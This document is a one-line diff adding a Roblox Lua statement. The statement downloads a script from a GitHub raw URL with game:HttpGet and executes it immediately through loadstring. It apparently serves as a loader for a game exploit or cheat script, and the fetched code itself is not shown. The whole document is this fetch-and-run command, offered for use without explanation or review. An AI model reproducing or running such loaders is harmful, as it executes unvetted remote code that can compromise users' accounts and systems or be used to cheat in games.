@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/idkazul/Para/refs/heads/main/NDB.lua"))()
